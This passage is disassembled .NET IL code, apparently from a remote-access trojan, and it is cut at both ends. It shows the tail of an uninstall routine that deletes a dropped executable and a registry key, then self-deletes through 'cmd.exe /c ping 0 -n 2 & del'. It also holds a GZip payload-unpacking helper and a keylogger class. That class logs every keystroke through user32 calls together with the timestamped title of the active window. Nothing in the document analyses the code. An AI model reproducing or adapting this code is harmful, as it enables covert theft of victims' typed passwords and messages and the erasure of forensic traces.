      IL_012b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0130:  ldc.i4.0
      IL_0131:  ldc.i4.0
      IL_0132:  ldc.i4.m1
      IL_0133:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0138:  pop
      IL_0139:  leave.s    IL_015d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_013b:  dup
      IL_013c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0141:  stloc.s    exception8
      IL_0143:  nop
      IL_0144:  ldloc.s    exception8
      IL_0146:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_014b:  nop
      IL_014c:  ldloc.s    exception8
      IL_014e:  stloc.s    exception3
      IL_0150:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0155:  nop
      IL_0156:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_015b:  leave.s    IL_015d

    }  // end handler
    IL_015d:  nop
    .try
    {
      IL_015e:  nop
      IL_015f:  ldsfld     class [mscorlib]System.IO.FileStream j.OK::FS
      IL_0164:  ldnull
      IL_0165:  cgt.un
      IL_0167:  stloc.s    V_12
      IL_0169:  ldloc.s    V_12
      IL_016b:  brfalse.s  IL_0199

      IL_016d:  ldsfld     class [mscorlib]System.IO.FileStream j.OK::FS
      IL_0172:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_0177:  nop
      IL_0178:  ldc.i4.7
      IL_0179:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_017e:  ldstr      "\\"
      IL_0183:  ldsfld     string j.OK::RG
      IL_0188:  ldstr      ".exe"
      IL_018d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0192:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0197:  nop
      IL_0198:  nop
      IL_0199:  nop
      IL_019a:  leave.s    IL_01be

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_019c:  dup
      IL_019d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01a2:  stloc.s    exception9
      IL_01a4:  nop
      IL_01a5:  ldloc.s    exception9
      IL_01a7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01ac:  nop
      IL_01ad:  ldloc.s    exception9
      IL_01af:  stloc.s    exception4
      IL_01b1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01b6:  nop
      IL_01b7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01bc:  leave.s    IL_01be

    }  // end handler
    IL_01be:  nop
    .try
    {
      IL_01bf:  nop
      IL_01c0:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_01c5:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_01ca:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_01cf:  ldstr      "Software"
      IL_01d4:  ldc.i4.1
      IL_01d5:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_01da:  ldsfld     string j.OK::RG
      IL_01df:  ldc.i4.0
      IL_01e0:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteSubKey(string,
                                                                                             bool)
      IL_01e5:  nop
      IL_01e6:  leave.s    IL_020a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01e8:  dup
      IL_01e9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01ee:  stloc.s    exception10
      IL_01f0:  nop
      IL_01f1:  ldloc.s    exception10
      IL_01f3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01f8:  nop
      IL_01f9:  ldloc.s    exception10
      IL_01fb:  stloc.s    exception5
      IL_01fd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0202:  nop
      IL_0203:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0208:  leave.s    IL_020a

    }  // end handler
    IL_020a:  nop
    .try
    {
      IL_020b:  nop
      IL_020c:  ldstr      "cmd.exe /c ping 0 -n 2 & del \""
      IL_0211:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0216:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_021b:  ldstr      "\""
      IL_0220:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0225:  ldc.i4.0
      IL_0226:  ldc.i4.0
      IL_0227:  ldc.i4.m1
      IL_0228:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_022d:  pop
      IL_022e:  leave.s    IL_0252

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0230:  dup
      IL_0231:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0236:  stloc.s    exception11
      IL_0238:  nop
      IL_0239:  ldloc.s    exception11
      IL_023b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0240:  nop
      IL_0241:  ldloc.s    exception11
      IL_0243:  stloc.s    exception6
      IL_0245:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_024a:  nop
      IL_024b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0250:  leave.s    IL_0252

    }  // end handler
    IL_0252:  nop
    IL_0253:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0258:  nop
    IL_0259:  ret
  } // end of method OK::UNS

  .method public static uint8[]  ZIP(uint8[] B) cil managed
  {
    // Code size       117 (0x75)
    .maxstack  4
    .locals init ([0] uint8[] ZIP,
             [1] class [mscorlib]System.IO.MemoryStream stream2,
             [2] class [System]System.IO.Compression.GZipStream 'stream',
             [3] uint8[] buffer2,
             [4] int32 count,
             [5] uint8[] 'array')
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor(uint8[])
    IL_0007:  stloc.1
    IL_0008:  ldloc.1
    IL_0009:  ldc.i4.0
    IL_000a:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                       valuetype [System]System.IO.Compression.CompressionMode)
    IL_000f:  stloc.2
    IL_0010:  ldc.i4.4
    IL_0011:  newarr     [mscorlib]System.Byte
    IL_0016:  stloc.3
    IL_0017:  ldloc.1
    IL_0018:  ldloc.1
    IL_0019:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
    IL_001e:  ldc.i4.5
    IL_001f:  conv.i8
    IL_0020:  sub.ovf
    IL_0021:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_0026:  nop
    IL_0027:  ldloc.1
    IL_0028:  ldloc.3
    IL_0029:  ldc.i4.0
    IL_002a:  ldc.i4.4
    IL_002b:  callvirt   instance int32 [mscorlib]System.IO.MemoryStream::Read(uint8[],
                                                                               int32,
                                                                               int32)
    IL_0030:  pop
    IL_0031:  ldloc.3
    IL_0032:  ldc.i4.0
    IL_0033:  call       int32 [mscorlib]System.BitConverter::ToInt32(uint8[],
                                                                      int32)
    IL_0038:  stloc.s    count
    IL_003a:  ldloc.1
    IL_003b:  ldc.i4.0
    IL_003c:  conv.i8
    IL_003d:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_0042:  nop
    IL_0043:  ldloc.s    count
    IL_0045:  ldc.i4.1
    IL_0046:  sub.ovf
    IL_0047:  ldc.i4.1
    IL_0048:  add.ovf
    IL_0049:  ldc.i4.1
    IL_004a:  sub.ovf
    IL_004b:  ldc.i4.1
    IL_004c:  add.ovf
    IL_004d:  newarr     [mscorlib]System.Byte
    IL_0052:  stloc.s    'array'
    IL_0054:  ldloc.2
    IL_0055:  ldloc.s    'array'
    IL_0057:  ldc.i4.0
    IL_0058:  ldloc.s    count
    IL_005a:  callvirt   instance int32 [System]System.IO.Compression.GZipStream::Read(uint8[],
                                                                                       int32,
                                                                                       int32)
    IL_005f:  pop
    IL_0060:  ldloc.2
    IL_0061:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0066:  nop
    IL_0067:  ldloc.1
    IL_0068:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_006d:  nop
    IL_006e:  ldloc.s    'array'
    IL_0070:  stloc.0
    IL_0071:  br.s       IL_0073

    IL_0073:  ldloc.0
    IL_0074:  ret
  } // end of method OK::ZIP

} // end of class j.OK

.class public auto ansi j.kl
       extends [mscorlib]System.Object
{
  .field private string LastAS
  .field private int32 LastAV
  .field private valuetype [System.Windows.Forms]System.Windows.Forms.Keys lastKey
  .field public string Logs
  .field public string vn
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       37 (0x25)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  nop
    IL_0007:  ldarg.0
    IL_0008:  ldc.i4.0
    IL_0009:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys j.kl::lastKey
    IL_000e:  ldarg.0
    IL_000f:  ldstr      ""
    IL_0014:  stfld      string j.kl::Logs
    IL_0019:  ldarg.0
    IL_001a:  ldstr      "[kl]"
    IL_001f:  stfld      string j.kl::vn
    IL_0024:  ret
  } // end of method kl::.ctor

  .method private instance string  AV() cil managed
  {
    // Code size       236 (0xec)
    .maxstack  5
    .locals init ([0] string AV,
             [1] int32 num,
             [2] native int foregroundWindow,
             [3] class [System]System.Diagnostics.Process processById,
             [4] bool V_4,
             [5] valuetype [mscorlib]System.DateTime V_5,
             [6] class [mscorlib]System.Exception exception1,
             [7] class [mscorlib]System.Exception exception)
    IL_0000:  nop
    .try
    {
      IL_0001:  nop
      IL_0002:  call       native int j.OK::GetForegroundWindow()
      IL_0007:  stloc.2
      IL_0008:  ldloc.2
      IL_0009:  ldloca.s   num
      IL_000b:  call       int32 j.kl::GetWindowThreadProcessId(native int,
                                                                int32&)
      IL_0010:  pop
      IL_0011:  ldloc.1
      IL_0012:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_0017:  stloc.3
      IL_0018:  ldloca.s   foregroundWindow
      IL_001a:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_001f:  ldarg.0
      IL_0020:  ldfld      int32 j.kl::LastAV
      IL_0025:  ceq
      IL_0027:  ldarg.0
      IL_0028:  ldfld      string j.kl::LastAS
      IL_002d:  ldloc.3
      IL_002e:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0033:  ldc.i4.0
      IL_0034:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0039:  ldc.i4.0
      IL_003a:  ceq
      IL_003c:  and
      IL_003d:  ldloc.3
      IL_003e:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0043:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0048:  ldc.i4.0
      IL_0049:  ceq
      IL_004b:  or
      IL_004c:  ldc.i4.0
      IL_004d:  ceq
      IL_004f:  stloc.s    V_4
      IL_0051:  ldloc.s    V_4
      IL_0053:  brfalse.s  IL_00bc

      IL_0055:  ldarg.0
      IL_0056:  ldloca.s   foregroundWindow
      IL_0058:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_005d:  stfld      int32 j.kl::LastAV
      IL_0062:  ldarg.0
      IL_0063:  ldloc.3
      IL_0064:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0069:  stfld      string j.kl::LastAS
      IL_006e:  ldc.i4.6
      IL_006f:  newarr     [mscorlib]System.String
      IL_0074:  dup
      IL_0075:  ldc.i4.0
      IL_0076:  ldstr      bytearray (0D 00 0A 00 01 00 ) 
      IL_007b:  stelem.ref
      IL_007c:  dup
      IL_007d:  ldc.i4.1
      IL_007e:  call       valuetype [mscorlib]System.DateTime [Microsoft.VisualBasic]Microsoft.VisualBasic.DateAndTime::get_Now()
      IL_0083:  stloc.s    V_5
      IL_0085:  ldloca.s   V_5
      IL_0087:  ldstr      "yy/MM/dd "
      IL_008c:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_0091:  stelem.ref
      IL_0092:  dup
      IL_0093:  ldc.i4.2
      IL_0094:  ldloc.3
      IL_0095:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_009a:  stelem.ref
      IL_009b:  dup
      IL_009c:  ldc.i4.3
      IL_009d:  ldstr      " "
      IL_00a2:  stelem.ref
      IL_00a3:  dup
      IL_00a4:  ldc.i4.4
      IL_00a5:  ldarg.0
      IL_00a6:  ldfld      string j.kl::LastAS
      IL_00ab:  stelem.ref
      IL_00ac:  dup
      IL_00ad:  ldc.i4.5
      IL_00ae:  ldstr      bytearray (01 00 0D 00 0A 00 ) 
      IL_00b3:  stelem.ref
      IL_00b4:  call       string [mscorlib]System.String::Concat(string[])
      IL_00b9:  stloc.0
      IL_00ba:  leave.s    IL_00ea

      IL_00bc:  nop
      IL_00bd:  leave.s    IL_00e1

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00bf:  dup
      IL_00c0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c5:  stloc.s    exception1
      IL_00c7:  nop
      IL_00c8:  ldloc.s    exception1
      IL_00ca:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00cf:  nop
      IL_00d0:  ldloc.s    exception1
      IL_00d2:  stloc.s    exception
      IL_00d4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d9:  nop
      IL_00da:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00df:  leave.s    IL_00e1

    }  // end handler
    IL_00e1:  nop
    IL_00e2:  ldstr      ""
    IL_00e7:  stloc.0
    IL_00e8:  br.s       IL_00ea

    IL_00ea:  ldloc.0
    IL_00eb:  ret
  } // end of method kl::AV

  .method private instance string  Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys k) cil managed
  {
    // Code size       475 (0x1db)
    .maxstack  3
    .locals init ([0] string Fix,
             [1] string str,
             [2] bool shiftKeyDown,
             [3] bool V_3,
             [4] bool V_4,
             [5] valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_5,
             [6] bool V_6,
             [7] bool V_7,
             [8] class [mscorlib]System.Exception exception1,
             [9] class [mscorlib]System.Exception exception,
             [10] bool V_10,
             [11] char V_11)
    IL_0000:  nop
    IL_0001:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_0006:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_000b:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_ShiftKeyDown()
    IL_0010:  stloc.2
    IL_0011:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_0016:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_001b:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CapsLock()
    IL_0020:  stloc.3
    IL_0021:  ldloc.3
    IL_0022:  brfalse.s  IL_0035

    IL_0024:  ldloc.2
    IL_0025:  stloc.s    V_4
    IL_0027:  ldloc.s    V_4
    IL_0029:  brfalse.s  IL_0030

    IL_002b:  ldc.i4.0
    IL_002c:  stloc.2
    IL_002d:  nop
    IL_002e:  br.s       IL_0034

    IL_0030:  nop
    IL_0031:  ldc.i4.1
    IL_0032:  stloc.2
    IL_0033:  nop
    IL_0034:  nop
    IL_0035:  nop
    .try
    {
      IL_0036:  nop
      IL_0037:  nop
      IL_0038:  ldarg.1
      IL_0039:  stloc.s    V_5
      IL_003b:  ldloc.s    V_5
      IL_003d:  ldc.i4.s   35
      IL_003f:  bgt.s      IL_008d

      IL_0041:  ldloc.s    V_5
      IL_0043:  ldc.i4.s   13
      IL_0045:  bgt.s      IL_006a

      IL_0047:  ldloc.s    V_5
      IL_0049:  ldc.i4.8
      IL_004a:  beq        IL_00da

      IL_004f:  br.s       IL_0051

      IL_0051:  ldloc.s    V_5
      IL_0053:  ldc.i4.s   9
      IL_0055:  beq        IL_0143

      IL_005a:  br.s       IL_005c

      IL_005c:  ldloc.s    V_5
      IL_005e:  ldc.i4.s   13
      IL_0060:  beq        IL_0115

      IL_0065:  br         IL_014f

      IL_006a:  ldloc.s    V_5
      IL_006c:  ldc.i4.s   16
      IL_006e:  sub
      IL_006f:  ldc.i4.1
      IL_0070:  ble.un     IL_00fd

      IL_0075:  br.s       IL_0077

      IL_0077:  ldloc.s    V_5
      IL_0079:  ldc.i4.s   32
      IL_007b:  beq        IL_0109

      IL_0080:  br.s       IL_0082

      IL_0082:  ldloc.s    V_5
      IL_0084:  ldc.i4.s   35
      IL_0086:  beq.s      IL_00fd

      IL_0088:  br         IL_014f

      IL_008d:  ldloc.s    V_5
      IL_008f:  ldc.i4     0xa3
      IL_0094:  bgt.s      IL_00b9

      IL_0096:  ldloc.s    V_5
      IL_0098:  ldc.i4.s   46
      IL_009a:  beq.s      IL_00da

      IL_009c:  br.s       IL_009e

      IL_009e:  ldloc.s    V_5
      IL_00a0:  ldc.i4.s   112
      IL_00a2:  sub
      IL_00a3:  ldc.i4.s   11
      IL_00a5:  ble.un.s   IL_00fd

      IL_00a7:  br.s       IL_00a9

      IL_00a9:  ldloc.s    V_5
      IL_00ab:  ldc.i4     0xa0
      IL_00b0:  sub
      IL_00b1:  ldc.i4.3
      IL_00b2:  ble.un.s   IL_00fd

      IL_00b4:  br         IL_014f

      IL_00b9:  ldloc.s    V_5
      IL_00bb:  ldc.i4     0x10000
      IL_00c0:  beq.s      IL_00fd

      IL_00c2:  br.s       IL_00c4

      IL_00c4:  ldloc.s    V_5
      IL_00c6:  ldc.i4     0x20000
      IL_00cb:  beq.s      IL_00fd

      IL_00cd:  br.s       IL_00cf

      IL_00cf:  ldloc.s    V_5
      IL_00d1:  ldc.i4     0x40000
      IL_00d6:  beq.s      IL_00fd

      IL_00d8:  br.s       IL_014f

      IL_00da:  nop
      IL_00db:  ldstr      "["
      IL_00e0:  ldarga.s   k
      IL_00e2:  constrained. [System.Windows.Forms]System.Windows.Forms.Keys
      IL_00e8:  callvirt   instance string [mscorlib]System.Enum::ToString()
      IL_00ed:  ldstr      "]"
      IL_00f2:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00f7:  stloc.0
      IL_00f8:  leave      IL_01d9

      IL_00fd:  nop
      IL_00fe:  ldstr      ""
      IL_0103:  stloc.0
      IL_0104:  leave      IL_01d9

      IL_0109:  nop
      IL_010a:  ldstr      " "
      IL_010f:  stloc.0
      IL_0110:  leave      IL_01d9

      IL_0115:  nop
      IL_0116:  ldarg.0
      IL_0117:  ldfld      string j.kl::Logs
      IL_011c:  ldstr      "[ENTER]\r\n"
      IL_0121:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
      IL_0126:  stloc.s    V_6
      IL_0128:  ldloc.s    V_6
      IL_012a:  brfalse.s  IL_0137

      IL_012c:  ldstr      ""
      IL_0131:  stloc.0
      IL_0132:  leave      IL_01d9

      IL_0137:  nop
      IL_0138:  ldstr      "[ENTER]\r\n"
      IL_013d:  stloc.0
      IL_013e:  leave      IL_01d9

      IL_0143:  nop
      IL_0144:  ldstr      "[TAP]\r\n"
      IL_0149:  stloc.0
      IL_014a:  leave      IL_01d9

      IL_014f:  nop
      IL_0150:  ldloc.2
      IL_0151:  stloc.s    V_7
      IL_0153:  ldloc.s    V_7
      IL_0155:  brfalse.s  IL_0166

      IL_0157:  ldarg.1
      IL_0158:  conv.ovf.u4
      IL_0159:  call       string j.kl::VKCodeToUnicode(uint32)
      IL_015e:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_0163:  stloc.0
      IL_0164:  leave.s    IL_01d9

      IL_0166:  nop
      IL_0167:  ldarg.1
      IL_0168:  conv.ovf.u4
      IL_0169:  call       string j.kl::VKCodeToUnicode(uint32)
      IL_016e:  stloc.1
      IL_016f:  leave.s    IL_01d4

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0171:  dup
      IL_0172:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0177:  stloc.s    exception1
      IL_0179:  nop
      IL_017a:  ldloc.s    exception1
      IL_017c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0181:  nop
      IL_0182:  ldloc.s    exception1
      IL_0184:  stloc.s    exception
      IL_0186:  ldloc.2
      IL_0187:  stloc.s    V_10
      IL_0189:  ldloc.s    V_10
      IL_018b:  brfalse.s  IL_01b1

      IL_018d:  ldarg.1
      IL_018e:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_0193:  stloc.s    V_11
      IL_0195:  ldloca.s   V_11
      IL_0197:  call       instance string [mscorlib]System.Char::ToString()
      IL_019c:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_01a1:  stloc.1
      IL_01a2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01a7:  nop
      IL_01a8:  ldloc.1
      IL_01a9:  stloc.0
      IL_01aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01af:  leave.s    IL_01d9

      IL_01b1:  nop
      IL_01b2:  ldarg.1
      IL_01b3:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_01b8:  stloc.s    V_11
      IL_01ba:  ldloca.s   V_11
      IL_01bc:  call       instance string [mscorlib]System.Char::ToString()
      IL_01c1:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_01c6:  stloc.1
      IL_01c7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01cc:  nop
      IL_01cd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01d2:  leave.s    IL_01d4

    }  // end handler
    IL_01d4:  nop
    IL_01d5:  ldloc.1
    IL_01d6:  stloc.0
    IL_01d7:  br.s       IL_01d9

    IL_01d9:  ldloc.0
    IL_01da:  ret
  } // end of method kl::Fix

  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int16  GetAsyncKeyState(int32 a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int32  GetKeyboardLayout(int32 a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          bool  GetKeyboardState(uint8[] a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          int32  GetWindowThreadProcessId(native int a,
                                          int32& b) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          uint32  MapVirtualKey(uint32 a,
                                uint32 b) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          int32  ToUnicodeEx(uint32 a,
                             uint32 b,
                             uint8[] c,
                             [out] class [mscorlib]System.Text.StringBuilder  marshal( lpwstr) d,
                             int32 e,
                             uint32 f,
                             native int g) cil managed preservesig
  {
  }
  .method private static string  VKCodeToUnicode(uint32 a) cil managed
  {
    // Code size       158 (0x9e)
    .maxstack  7
    .locals init ([0] string VKCodeToUnicode,
             [1] class [mscorlib]System.Text.StringBuilder d,
             [2] uint8[] buffer,
             [3] uint32 b,
             [4] int32 num3,
             [5] native int keyboardLayout,
             [6] bool V_6,
             [7] class [mscorlib]System.Exception exception1,
             [8] class [mscorlib]System.Exception exception,
             [9] valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_9)
    IL_0000:  nop
    .try
    {
      IL_0001:  nop
      IL_0002:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor()
      IL_0007:  stloc.1
      IL_0008:  ldc.i4     0xff
      IL_000d:  newarr     [mscorlib]System.Byte
      IL_0012:  stloc.2
      IL_0013:  ldloc.2
      IL_0014:  call       bool j.kl::GetKeyboardState(uint8[])
      IL_0019:  ldc.i4.0
      IL_001a:  ceq
      IL_001c:  stloc.s    V_6
      IL_001e:  ldloc.s    V_6
      IL_0020:  brfalse.s  IL_002a

      IL_0022:  ldstr      ""
      IL_0027:  stloc.0
      IL_0028:  leave.s    IL_009c

      IL_002a:  nop
      IL_002b:  ldarg.0
      IL_002c:  ldc.i4.0
      IL_002d:  call       uint32 j.kl::MapVirtualKey(uint32,
                                                      uint32)
      IL_0032:  stloc.3
      IL_0033:  ldc.i4.0
      IL_0034:  stloc.s    num3
      IL_0036:  call       native int j.OK::GetForegroundWindow()
      IL_003b:  ldloca.s   num3
      IL_003d:  call       int32 j.kl::GetWindowThreadProcessId(native int,
                                                                int32&)
      IL_0042:  call       int32 j.kl::GetKeyboardLayout(int32)
      IL_0047:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
      IL_004c:  stloc.s    keyboardLayout
      IL_004e:  ldarg.0
      IL_004f:  ldloc.3
      IL_0050:  ldloc.2
      IL_0051:  ldloc.1
      IL_0052:  ldc.i4.5
      IL_0053:  ldc.i4.0
      IL_0054:  ldloc.s    keyboardLayout
      IL_0056:  call       int32 j.kl::ToUnicodeEx(uint32,
                                                   uint32,
                                                   uint8[],
                                                   class [mscorlib]System.Text.StringBuilder,
                                                   int32,
                                                   uint32,
                                                   native int)
      IL_005b:  pop
      IL_005c:  ldloc.1
      IL_005d:  callvirt   instance string [mscorlib]System.Text.StringBuilder::ToString()
      IL_0062:  stloc.0
      IL_0063:  leave.s    IL_009c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0065:  dup
      IL_0066:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_006b:  stloc.s    exception1
      IL_006d:  nop
      IL_006e:  ldloc.s    exception1
      IL_0070:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0075:  nop
      IL_0076:  ldloc.s    exception1
      IL_0078:  stloc.s    exception
      IL_007a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_007f:  nop
      IL_0080:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0085:  leave.s    IL_0087

    }  // end handler
    IL_0087:  nop
    IL_0088:  ldarg.0
    IL_0089:  conv.ovf.i4.un
    IL_008a:  stloc.s    V_9
    IL_008c:  ldloca.s   V_9
    IL_008e:  constrained. [System.Windows.Forms]System.Windows.Forms.Keys
    IL_0094:  callvirt   instance string [mscorlib]System.Enum::ToString()
    IL_0099:  stloc.0
    IL_009a:  br.s       IL_009c

    IL_009c:  ldloc.0
    IL_009d:  ret
  } // end of method kl::VKCodeToUnicode

  .method public instance void  WRK() cil managed
  {
    // Code size       351 (0x15f)
    .maxstack  5
    .locals init ([0] int32 num,
             [1] int32 a,
             [2] bool V_2,
             [3] valuetype [System.Windows.Forms]System.Windows.Forms.Keys k,
             [4] string str,
             [5] bool V_5,
             [6] bool V_6,
             [7] bool V_7,
             [8] int32 num3,
